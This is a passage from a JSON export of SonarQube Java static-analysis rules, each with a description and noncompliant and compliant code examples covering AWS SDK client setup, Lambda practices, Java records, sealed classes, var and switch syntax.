Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When explicitly setting the region on an AWS Client, you should always prefer providing the value from the Enum <a\nhref=\"https://docs.aws.amazon.com/AWSJavaSDK/latest/javadoc/index.html?com/amazonaws/regions/Regions.html\">Regions</a> instead of a hardcoded String.\nThis will allow you to transparently support any change in the API and avoid mistakes.</p>\n<p>This rule reports an issue when a hardcoded string is used instead of an available enum value.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nAmazonS3ClientBuilder.standard().withRegion(\"eu_west_1\").build();\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nAmazonS3ClientBuilder.standard().withRegion(Regions.EU_WEST_1).build();\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6262","summary":"AWS region should not be set with a hardcoded String","tags":["aws"],"versions":{"serverEdition":"Developer","serverVersion":"9.6.1.59531","communityVersion":"9.6.1.59531"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Invoking other Lambdas synchronously from a Lambda is a scalability anti-pattern. Lambdas have a maximum execution time before they timeout (15\nminutes as of May 2021). Having to wait for another Lambda to finish its execution could lead to a timeout.</p>\n<p>A better solution is to generate&nbsp;events that can be consumed asynchronously by other Lambdas.</p>\n<h3>Noncompliant code example</h3>\n<p>With AWS SDKv1</p>\n<pre>\nInvokeRequest invokeRequest = new InvokeRequest()\n         .withFunctionName(\"myFunction\");\n\nAWSLambda awsLambda = AWSLambdaClientBuilder.standard()\n\t\t.withCredentials(new ProfileCredentialsProvider())\n\t\t.withRegion(Regions.US_WEST_2).build();\n\nawsLambda.invoke(invokeRequest); // Noncompliant\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/lambda/latest/dg/best-practices.html\">Best practices for working with AWS Lambda functions</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6246","summary":"Lambdas should not invoke other lambdas synchronously","tags":["aws"],"versions":{"serverEdition":"Developer","serverVersion":"9.6.1.59531","communityVersion":"9.6.1.59531"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Some API, like the AWS SDK, heavily rely on the builder pattern to create different data structures. Despite all the benefits, this pattern can\nbecome really verbose, especially when dealing with nested structures. In order to reach a more concise code, \"Consumer Builders\", also called\n\"Consumer Interface\" are often introduced.</p>\n<p>The idea is to overload the methods taking others structures in a Builder with a Consumer of Builder instead. This enables to use a lambda instead\nof nesting another Builder, resulting in more concise and readable code.</p>\n<p>This rule reports an issue when the Consumer Builder methods could be used instead of the classical ones.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nSendEmailRequest.builder()\n  .destination(Destination.builder()\n    .toAddresses(\"to-email@domain.com\")\n    .bccAddresses(\"bcc-email@domain.com\")\n    .build())\n.build();\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nSendEmailRequest.builder()\n  .destination(d -&gt; d.toAddresses(\"to-email@domain.com\").bccAddresses(\"bcc-email@domain.com\"))\n  .build();\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://aws.amazon.com/fr/blogs/developer/consumer-builders-in-the-aws-sdk-for-java-v2/\">Consumer Builders in the AWS SDK for Java\n  v2</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6244","summary":"Consumer Builders should be used","tags":["aws"],"versions":{"serverEdition":"Developer","serverVersion":"9.6.1.59531","communityVersion":"9.6.1.59531"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Resources that can be reused across multiple invocations of the Lambda function should be initialized at construction time. For example in the\nconstructor of the class, or in field initializers. This way, when the same container is reused for multiple function invocations, the existing\ninstance can be reused, along with all resources stored in its fields. It is a good practice to reuse SDK clients and database connections by\ninitializing them at class construction time, to avoid recreating them on every lambda invocation. Failing to do so can lead to performance\ndegradation, and when not closed properly, even out of memory errors.</p>\n<p>This rule reports an issue when the SDK client or the database connection is initialized locally inside a Lambda function.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class App implements RequestHandler&lt;Object, Object&gt; {\n    @Override\n    public Object handleRequest(final Object input, final Context context) {\n      S3Client s3Client = DependencyFactory.s3Client();\n      s3Client.listBuckets();\n      // ...\n    }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class App implements RequestHandler&lt;Object, Object&gt; {\n    private final S3Client s3Client;\n\n    public App() {\n      s3Client = DependencyFactory.s3Client();\n    }\n\n    @Override\n    public Object handleRequest(final Object input, final Context context) {\n      s3Client.listBuckets();\n      // ...\n    }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://aws.amazon.com/fr/blogs/developer/tuning-the-aws-java-sdk-2-x-to-reduce-startup-time/\">Tuning the AWS Java SDK 2.x to reduce\n  startup time</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/lambda/latest/dg/best-practices.html\">Best practices for working with AWS Lambda functions</a> </li>\n  <li> <a href=\"https://aws.amazon.com/fr/blogs/compute/container-reuse-in-lambda/\">Understanding Container Reuse in AWS Lambda</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6243","summary":"Reusable resources should be initialized at construction time of Lambda functions","tags":["aws"],"versions":{"serverEdition":"Developer","serverVersion":"9.6.1.59531","communityVersion":"9.6.1.59531"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>If the credentials provider is not specified when creating a new AwsClient with an <a\nhref=\"https://sdk.amazonaws.com/java/api/latest/software/amazon/awssdk/awscore/client/builder/AwsClientBuilder.html\">AwsClientBuilder</a>, the AWS SDK\nwill execute some logic to identify it automatically.</p>\n<p>While it will probably identify the correct one, this extra logic will slow down startup time, already known to be a hotspot.</p>\n<p>You should therefore always define the logic to set the credentials provider yourself. This is typically done by retrieving it from the Lambda\nprovided environment variable.</p>\n<p>This will make the code more explicit and spare initialization time.</p>\n<p>This rule reports an issue when the credentials provider is not set when creating an AwsClient.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nS3Client.builder()\n    .region(Region.of(System.getenv(SdkSystemSetting.AWS_REGION.environmentVariable())))\n    .build();\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nS3Client.builder()\n    .region(Region.of(System.getenv(SdkSystemSetting.AWS_REGION.environmentVariable()))\n    .credentialsProvider(EnvironmentVariableCredentialsProvider.create())\n    .build();\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://aws.amazon.com/fr/blogs/developer/tuning-the-aws-java-sdk-2-x-to-reduce-startup-time/\">Tuning the AWS Java SDK 2.x to reduce\n  startup time</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/sdk-for-java/latest/developer-guide/lambda-optimize-starttime.html\">Optimizing cold start performance for\n  AWS Lambda</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/lambda/latest/dg/configuration-envvars.html\">Environment variable configuration</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/sdk-for-java/v1/developer-guide/credentials.html\">Default Credential Provider Chain</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6242","summary":"Credentials Provider should be set explicitly when creating a new \"AwsClient\"","tags":["startup-time","aws"],"versions":{"serverEdition":"Developer","serverVersion":"9.6.1.59531","communityVersion":"9.6.1.59531"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>If the region is not specified when creating a new AwsClient with an <a\nhref=\"https://sdk.amazonaws.com/java/api/latest/software/amazon/awssdk/awscore/client/builder/AwsClientBuilder.html\">AwsClientBuilder</a>, the AWS SDK\nwill execute some logic to identify the endpoint automatically.</p>\n<p>While it will probably identify the correct one, this extra logic will slow down startup time, already known to be a hotspot.</p>\n<p>You should therefore always define the logic to set the region yourself. This is typically done by retrieving the region from the Lambda provided\nAWS_REGION environment variable.</p>\n<p>This will make the code more explicit and spare initialization time.</p>\n<p>This rule reports an issue when the region is not set when creating an AwsClient.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nS3Client.builder()\n    .credentialsProvider(EnvironmentVariableCredentialsProvider.create())\n    .build();\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nS3Client.builder()\n    .region(Region.of(System.getenv(SdkSystemSetting.AWS_REGION.environmentVariable()))\n    .credentialsProvider(EnvironmentVariableCredentialsProvider.create())\n    .build();\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://aws.amazon.com/fr/blogs/developer/tuning-the-aws-java-sdk-2-x-to-reduce-startup-time/\">Tuning the AWS Java SDK 2.x to reduce\n  startup time</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/sdk-for-java/latest/developer-guide/lambda-optimize-starttime.html\">Optimizing cold start performance for\n  AWS Lambda</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/lambda/latest/dg/configuration-envvars.html\">Environment variable configuration</a> </li>\n  <li> <a\n  href=\"https://docs.aws.amazon.com/sdk-for-java/v1/developer-guide/java-dg-region-selection.html#automatically-determine-the-aws-region-from-the-environment\">Automatically Determine the AWS Region</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6241","summary":"Region should be set explicitly when creating a new \"AwsClient\"","tags":["startup-time","aws"],"versions":{"serverEdition":"Developer","serverVersion":"9.6.1.59531","communityVersion":"9.6.1.59531"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>In Records serialization is not done the same way as for ordinary serializable or externalizable classes. Records serialization does not rely on\nthe <code>serialVersionUID</code> field, because the requirement to have this field equal is waived for record classes. By default, all records will\nhave this field equal to <code>0L</code> and there is no need to specify this field with <code>0L</code> value and it is possible to specify it with\nsome custom value to support serialization/deserialization involving ordinary classes.</p>\n<p>This rule raises an issue when there is a <code>private static final long serialVersionUID</code> field which is set to <code>0L</code> in a Record\nclass.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nrecord Person(String name, int age) implements Serializable {\n@Serial\n  private static final long serialVersionUID = 0L; // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nrecord Person(String name, int age) implements Serializable {} // Compliant\n\nrecord Person(String name, int age) implements Serializable {\n@Serial\n  private static final long serialVersionUID = 42L; // Compliant\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se16/html/jls-8.html#jls-8.10\">Records specification</a> </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/16/docs/specs/serialization/serial-arch.html#serialization-of-records\">Serialization of\n  records</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6219","summary":"'serialVersionUID' field should not be set to '0L' in records","tags":["java16"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In records, the default behavior of the <code>equals()</code> method is to check the equality by field values. This works well for primitive fields\nor fields, whose type overrides <code>equals()</code>, but this behavior doesnât work as expected for array fields.</p>\n<p>By default, array fields are compared by their reference, and overriding <code>equals()</code> is highly appreciated to achieve the deep equality\ncheck. The same strategy applies to <code>hashCode()</code> and <code>toString()</code> methods.</p>\n<p>This rule reports an issue if a record class has an array field and is not overriding <code>equals()</code>, <code>hashCode()</code> or\n<code>toString()</code> methods.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nrecord Person(String[] names, int age) {} // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nrecord Person(String[] names, int age) {\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        Person person = (Person) o;\n        return age == person.age &amp;&amp; Arrays.equals(names, person.names);\n    }\n\n    @Override\n    public int hashCode() {\n        int result = Objects.hash(age);\n        result = 31 * result + Arrays.hashCode(names);\n        return result;\n    }\n\n    @Override\n    public String toString() {\n        return \"Person{\" +\n                \"names=\" + Arrays.toString(names) +\n                \", age=\" + age +\n                '}';\n    }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se16/html/jls-8.html#jls-8.10\">Records specification</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6218","summary":"Equals method should be overridden in records containing array fields","tags":["java16"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p><code>sealed</code> classes were introduced in Java 17. This feature is very useful if there is a need to define a strict hierarchy and restrict\nthe possibility of extending classes. In order to mention all the allowed subclasses, there is a keyword <code>permits</code>, which should be\nfollowed by subclasses' names.</p>\n<p>This notation is quite useful if subclasses of a given <code>sealed</code> class can be found in different files, packages, or even modules. In\ncase when all subclasses are declared in the same file there is no need to mention the explicitly and <code>permits</code> part of a declaration can\nbe omitted.</p>\n<p>This rule reports an issue if all subclasses of a <code>sealed</code> class are declared in the same file as their superclass.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nsealed class A permits B, C, D, E {} // Noncompliant\nfinal class B extends A {}\nfinal class C extends A {}\nfinal class D extends A {}\nfinal class E extends A {}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nsealed class A {} // Compliant\nfinal class B extends A {}\nfinal class C extends A {}\nfinal class D extends A {}\nfinal class E extends A {}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se17/html/jls-8.html#jls-8.1.1.2\">Sealed Classes specification</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-6217","summary":"Permitted types of a sealed class should be omitted if they are declared in the same file","tags":["java17"],"versions":{"serverEdition":"Developer","serverVersion":"9.3.0.51899","communityVersion":"9.3.0.51899"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In general, altering or bypassing the accessibility of classes, methods, or fields violates the encapsulation principle and could lead to runtime\nerrors. For records the case is even trickier: you cannot change the visibility of recordsâs fields and trying to update the existing value will lead\nto <code>IllegalAccessException</code> at runtime.</p>\n<p>This rule raises an issue when reflection is used to change the visibility of a recordâs field, and when it is used to directly update a recordâs\nfield value.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nrecord Person(String name, int age) {}\n\nPerson person = new Person(\"A\", 26);\nField field = Person.class.getDeclaredField(\"name\");\nfield.setAccessible(true); // secondary\nfield.set(person, \"B\"); // Noncompliant\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se16/html/jls-8.html#jls-8.10\">Records specification</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6216","summary":"Reflection should not be used to increase accessibility of records' fields","tags":["java16"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Even if it is technically possible, <a href=\"https://docs.oracle.com/javase/specs/jls/se16/html/jls-3.html#jls-3.8\">Restricted Identifiers</a>\nshould not be used as identifiers. This is only possible for compatibility reasons, using it in Java code is confusing and should be avoided.</p>\n<p>Note that this applies to any version of Java, including the one where these identifiers are not yet restricted, to avoid future confusion.</p>\n<p>This rule reports an issue when restricted identifiers:</p>\n<ul>\n  <li> var </li>\n  <li> yield </li>\n  <li> record </li>\n</ul>\n<p>are used as identifiers.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nvar var = \"var\"; // Noncompliant: compiles but this code is confusing\nvar = \"what is this?\";\n\nint yield(int i) { // Noncompliant\n  return switch (i) {\n    case 1: yield(0); // This is a yield from switch expression, not a recursive call.\n    default: yield(i-1);\n  };\n}\n\nString record = \"record\"; // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nvar myVariable = \"var\";\n\nint minusOne(int i) {\n  return switch (i) {\n    case 1: yield(0);\n    default: yield(i-1);\n  };\n}\n\nString myRecord = \"record\";\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se16/html/jls-3.html#jls-3.8\">JLS16, 3.8: Identifiers</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6213","summary":"Restricted Identifiers should not be used as Identifiers","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Info","description":"<h2>Why is this an issue?</h2>\n<p>In Java 10 <a href=\"https://openjdk.java.net/jeps/286\">Local-Variable Type Inference</a> was introduced. It allows you to omit the expected type of\na variable by declaring it with the <code>var</code> keyword.</p>\n<p>While it is not always possible or cleaner to use this new way of declaring a variable, when the type on the left is the same as the one on the\nright in an assignment, using the <code>var</code> will result in a more concise code.</p>\n<p>This rule reports an issue when the expected type of the variable is the same as the returned type of assigned expression and the type can be\neasily inferred by the reader, either when the type is already mentioned in the name or the initializer, or when the expression is\nself-explanatory.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nMyClass myClass = new MyClass();\n\nint i = 10; // Type is self-explanatory\n\nMyClass something = MyClass.getMyClass(); // Type is already mentioned in the initializer\n\nMyClass myClass = get(); // Type is already mentioned in the name\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nvar myClass = new MyClass();\n\nvar i = 10;\n\nvar something = MyClass.getMyClass();\n\nvar myClass = get();\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://openjdk.java.net/jeps/286\">JEP 286: Local-Variable Type Inference</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"INFO"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-6212","summary":"Local-Variable Type Inference should be used","tags":["java10"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Before records appeared in Java 16, there was a common way to represent getters for private fields of a class:&nbsp; a method named \"get\" with a\ncapitalized field name. For example, for a&nbsp;<code>String</code> field named \"myField\" the signature of the getter method will be: <code>public\nString getMyField()</code></p>\n<p>In records, getters are named differently. Getters created by default do not contain the \"get\" prefix. So for a recordâs <code>String</code> field\n\"myField\" the getter method will be: <code>public String myField()</code></p>\n<p>This means that if you want to override the default getter behavior it is better to use the method provided by records instead of creating a new\none. Otherwise, this will bring confusion to the users of the record as two getters will be available and even leads to bugs if the behavior is\ndifferent from the default one.</p>\n<p>This rule raises an issue when a record contains a getter named \"get\" with a capitalized field name that is not behaving the same as the default\none.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nrecord Person(String name, int age) {\n    public String getName() { // Noncompliant\n        return name.toUpperCase(Locale.ROOT);\n    }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nrecord Person(String name, int age) {\n    @Override\n    public String name() { // Compliant\n        return name.toUpperCase(Locale.ROOT);\n    }\n}\n\nrecord Person(String name, int age) {\n    public String getNameUpperCase() { // Compliant\n        return name.toUpperCase(Locale.ROOT);\n    }\n}\nrecord Person(String name, int age) {\n    public String getName() { // Compliant, is equivalent to 'name()'\n        return name;\n    }\n}\nrecord Person(String name, int age) {\n    @Override\n    public String name() { // Compliant\n        return name.toUpperCase(Locale.ROOT);\n    }\n    public String getName() { // Compliant, equal to 'name()'\n        return name.toUpperCase(Locale.ROOT);\n    }\n}\n</pre>\n<h3>Exceptions</h3>\n<p>If the implementations of <code>getMyField()</code> and <code>myField()</code> methods are equivalent, the issue should not be raised as this was\nprobably done to support compatibility with the previous convention.</p>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se16/html/jls-8.html#jls-8.10\">Records specification</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-6211","summary":"Custom getter method should not be used to override record's getter behavior","tags":["java16"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>In Records, serialization is not done the same way as for ordinary serializable or externalizable classes. The serialized representation of a\nrecord object will be a sequence of values (record components). During the deserialization of records, the stream of components is read and components\nare constructed. Then the record object is recreated by invoking the recordâs canonical constructor with the component values serving as arguments (or\ndefault values for absent arguments).</p>\n<p>This process cannot be customized, so any class-specific <code>writeObject</code>, <code>readObject</code>, <code>readObjectNoData</code>,\n<code>writeExternal</code>, and <code>readExternal</code> methods or <code>serialPersistentFields</code> fields in record classes are ignored during\nserialization and deserialization.</p>\n<p>However, there is a way to substitute serialized/deserialized objects in <code>writeReplace</code> and <code>readResolve</code>.</p>\n<p>This rule raises an issue when any of <code>writeObject</code>, <code>readObject</code>, <code>readObjectNoData</code>, <code>writeExternal</code>,\n<code>readExternal</code> or <code>serialPersistentFields</code> are present as members in a Record class.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nrecord Record() implements Serializable {\n  @Serial\n  private static final ObjectStreamField[] serialPersistentFields = new ObjectStreamField[0]; // Noncompliant\n  @Serial\n  private void writeObject(ObjectOutputStream out) throws IOException { // Noncompliant\n    ...\n  }\n}\nrecord Record() implements Externalizable {\n  @Override\n  public void writeExternal(ObjectOutput out) throws IOException { // Noncompliant\n    ...\n  }\n  @Override\n  public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException { // Noncompliant\n    ...\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nrecord Record() implements Serializable {}\n\nrecord Record() implements Serializable {\n  private Object writeReplace() throws ObjectStreamException {\n    ...\n  }\n  private Object readResolve() throws ObjectStreamException {\n    ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se16/html/jls-8.html#jls-8.10\">Records specification</a> </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/16/docs/specs/serialization/serial-arch.html#serialization-of-records\">serialization of\n  records</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6209","summary":"Members ignored during record serialization should not be used","tags":["java16"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Info","description":"<h2>Why is this an issue?</h2>\n<p>In Java 14 there is a new way to write cases in Switch Statement and Expression when the same action should be performed for different cases.\nInstead of declaring multiples branches with the same action, you can combine all of them in a single case group, separated with commas. It will\nresult in a more concise code and improved readability.</p>\n<p>This rule reports an issue when multiple cases in a Switch can be grouped into a single comma-separated case.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n// Switch Expression\nint i = switch (mode) {\n  case \"a\":\n  case \"b\":\n    yield 1;\n  default:\n    yield 3;\n};\n\n// Switch Statement\nswitch (mode) {\n  case \"a\":\n  case \"b\":\n    doSomething();\n    break;\n  default:\n    doSomethingElse();\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n// Switch Expression\nint i = switch (mode) {\n  case \"a\", \"b\":\n    yield 1;\n  default:\n    yield 3;\n};\n\n// Switch Statement\nswitch (mode) {\n  case \"a\", \"b\":\n    doSomething();\n    break;\n  default:\n    doSomethingElse();\n}\n\n// Or even better:\nswitch (mode) {\n  case \"a\", \"b\" -&gt; doSomething();\n  default -&gt; doSomethingElse();\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://openjdk.java.net/jeps/361\">JEP 361: Switch Expressions</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"INFO"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6208","summary":"Comma-separated labels should be used in Switch with colon case","tags":["java14"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In Java 16 records represent a brief notation for immutable data structures. Records have autogenerated implementations for constructors with all\nparameters, <code>getters</code>, <code>equals</code>, <code>hashcode</code> and <code>toString</code>. Although these methods can still be overridden\ninside records, there is no use to do so if no special logic is required.</p>\n<p>This rule reports an issue on empty compact constructors, trivial canonical constructors and simple getter methods with no additional logic.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nrecord Person(String name, int age) {\n  Person(String name, int age) { // Noncompliant, already autogenerated\n    this.name = name;\n    this.age = age;\n  }\n}\n\nrecord Person(String name, int age) {\n  Person { // Noncompliant, no need for empty compact constructor\n  }\n  public String name() { // Noncompliant, already autogenerated\n    return name;\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nrecord Person(String name, int age) { } // Compliant\n\nrecord Person(String name, int age) {\n  Person(String name, int age) { // Compliant\n    this.name = name.toLowerCase(Locale.ROOT);\n    this.age = age;\n  }\n}\n\nrecord Person(String name, int age) {\n  Person { // Compliant\n    if (age &lt; 0) {\n      throw new IllegalArgumentException(\"Negative age\");\n    }\n  }\n  public String name() { // Compliant\n    return name.toUpperCase(Locale.ROOT);\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se16/html/jls-8.html#jls-8.10\">Records specification</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6207","summary":"Redundant constructors/methods should be avoided in records","tags":["java16"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In Java 16 <code>records</code> are finalized and can be safely used in production code. <code>Records</code> represent immutable read-only data\nstructure and should be used instead of creating immutable classes. Immutability of records is guaranteed by the Java language itself, while\nimplementing immutable classes on your own might lead to some bugs.</p>\n<p>One of the important aspects of <code>records</code> is that final fields canât be overwritten using reflection.</p>\n<p>This rule reports an issue on classes for which all these statements are true:</p>\n<ul>\n  <li> all instance fields are private and final </li>\n  <li> has only one constructor with a parameter for all fields </li>\n  <li> has getters for all fields </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\nfinal class Person { // Noncompliant\n  private final String name;\n  private final int age;\n\n  public Person(String name, int age) {\n    this.name = name;\n    this.age = age;\n  }\n\n  public String getName() {...}\n\n  public int getAge() {...}\n\n  @Override\n  public boolean equals(Object o) {...}\n\n  @Override\n  public int hashCode() {...}\n\n  @Override\n  public String toString() {...}\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nrecord Person(String name, int age) { }\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se16/html/jls-8.html#jls-8.10\">Records specification</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6206","summary":"Records should be used instead of ordinary classes when representing immutable data 